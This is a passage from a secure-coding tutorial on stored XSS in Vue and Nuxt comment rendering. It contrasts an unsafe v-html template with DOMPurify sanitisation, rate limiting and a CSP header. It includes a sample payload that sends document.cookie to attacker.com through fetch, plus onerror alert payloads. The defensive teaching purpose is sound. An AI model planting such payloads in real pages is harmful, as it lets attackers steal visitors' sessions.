      <!-- XSS: rendering unsafely sanitized HTML -->
      <div class="comment-body" v-html="c.content"></div>
    </article>
  </div>
</template>
```

**Attack Payload** (stored XSS in a comment):
```html
<a href="#" onclick="fetch('https://attacker.com/steal?cookie='+document.cookie)">Check this out</a>
```

Another payload that bypasses naive `<script>` removal:
```html
<img src=x onerror="alert('XSS: '+document.domain)">
```

**Why This Is Dangerous**:
- `v-html` tells Vue to trust and inject raw HTML directly into the DOM, bypassing its built-in escaping.
- Home-grown regex "sanitizers" cannot safely handle all HTML/JS edge cases and event handlers.
- An attacker can store malicious HTML/JS (e.g., in comments) and execute it in every visitor's browser, stealing cookies or impersonating users.

**SECURE VERSION**:

```typescript
// src/components/SafeCommentList.vue
<script lang="ts" setup>
import { ref, onMounted } from 'vue';
import DOMPurify from 'dompurify';

interface Comment {
  id: number;
  author: string;
  content: string; // Untrusted from server
}

const comments = ref<Comment[]>([]);

// Configure DOMPurify once; optionally use a strict profile
const purifier = DOMPurify as typeof DOMPurify & { sanitize: (dirty: string, cfg?: DOMPurify.Config) => string };

function sanitizeHtml(dirty: string): string {
  // PRIMARY DEFENSE: robust, battle-tested HTML sanitizer
  return purifier.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload'],
    FORBID_TAGS: ['style', 'script', 'iframe', 'object']
  });
}

async function loadComments(): Promise<void> {
  try {
    const res = await fetch('/api/comments', { credentials: 'include' });
    if (!res.ok) {
      console.error('Failed to load comments', { status: res.status });
      return; // Fail safely, show empty state
    }
    const data: Comment[] = await res.json();

    comments.value = data.map((c) => ({
      ...c,
      // DEFENSE-IN-DEPTH: sanitize on read, even if backend also sanitizes
      content: sanitizeHtml(c.content)
    }));
  } catch (err) {
    console.error('Error loading comments', err);
    // Do not expose internal error details to the user
  }
}

onMounted(() => {
  void loadComments();
});
</script>

<template>
  <div class="comments">
    <article v-for="c in comments" :key="c.id" class="comment">
      <h3>{{ c.author }}</h3>
      <!-- Still uses v-html, but only with strictly sanitized content -->
      <div class="comment-body" v-html="c.content"></div>
    </article>
  </div>
</template>
```

**Key Security Controls**:
- **Robust HTML sanitization**: Uses a well-maintained library (DOMPurify) with an allowlist of safe tags/attributes, blocking scripts and event handlers.
- **Defense in depth (backend + frontend)**: Sanitizes on the client even if the server is also sanitizing/validating, reducing risk from backend misconfigurations.
- **Safe error handling and logging**: Fails closed (shows no comments rather than partial unsafe data), logs errors to the console or logging system without exposing stack traces or internals to end-users.

In a production Vue 3 / Nuxt environment with SSR, you must assume any HTML rendered on either the server or client can be an XSS vector. Use a consistent sanitization strategy, strict configuration, and layered defenses.

**PRODUCTION PATTERN**:

```typescript
// nuxt-app/server/utils/htmlSanitizer.ts
import DOMPurify from 'isomorphic-dompurify';

// PRIMARY: shared sanitizer used on server (SSR) and client (hydration)
export function sanitizeUserHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [
      'b', 'strong', 'i', 'em', 'u',
      'p', 'br', 'ul', 'ol', 'li',
      'a', 'code', 'pre'
    ],
    ALLOWED_ATTR: ['href', 'title'],
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
    FORBID_ATTR: [/^on/i], // block any inline event handlers
    // Optional security flags
    USE_PROFILES: { html: true }
  });
}

// nuxt-app/server/api/comments.get.ts (Nitro server route)
import { defineEventHandler, getQuery } from 'h3';
import { sanitizeUserHtml } from '../utils/htmlSanitizer';

interface Comment {
  id: number;
  author: string;
  content: string;
  createdAt: string;
}

// Simple in-memory rate limiting by IP for demo purposes
const requestCounts = new Map<string, { count: number; ts: number }>();

function isRateLimited(ip: string, limit = 60, windowMs = 60000): boolean {
  const now = Date.now();
  const entry = requestCounts.get(ip) || { count: 0, ts: now };
  if (now - entry.ts > windowMs) {
    entry.count = 0;
    entry.ts = now;
  }
  entry.count += 1;
  requestCounts.set(ip, entry);
  return entry.count > limit;
}

export default defineEventHandler(async (event) => {
  const ip = event.node.req.socket.remoteAddress || 'unknown';

  // DEFENSE: Basic rate limiting to reduce automated attack attempts
  if (isRateLimited(ip)) {
    event.node.res.statusCode = 429;
    return { error: 'Too many requests' };
  }

  const query = getQuery(event);
  const postId = Number(query.postId ?? '0');
  if (!Number.isInteger(postId) || postId <= 0) {
    event.node.res.statusCode = 400;
    return { error: 'Invalid postId' };
  }

  try {
    // Fetch from your database (placeholder data here)
    const rawComments: Comment[] = [
      {
        id: 1,
        author: 'Alice',
        content: '<b>Hello</b> <img src=x onerror="alert(1)">',
        createdAt: new Date().toISOString()
      }
    ];

    const safeComments = rawComments.map((c) => ({
      ...c,
      // SERVER-SIDE SANITIZATION before SSR
      content: sanitizeUserHtml(c.content)
    }));

    // AUDIT LOGGING: minimal info, no user secrets
    console.info('Comments served', { postId, count: safeComments.length, ip });

    event.node.res.setHeader('Content-Security-Policy', [
      "default-src 'self'",
      "script-src 'self' 'nonce-abc123'",
      "object-src 'none'",
      "base-uri 'self'",
      "frame-ancestors 'self'"
    ].join('; '));

    return safeComments;
  } catch (err) {
    console.error('Error fetching comments', { postId, ip, err });
    event.node.res.statusCode = 500;
    return { error: 'Internal server error' };
  }
});

// nuxt-app/components/CommentList.vue
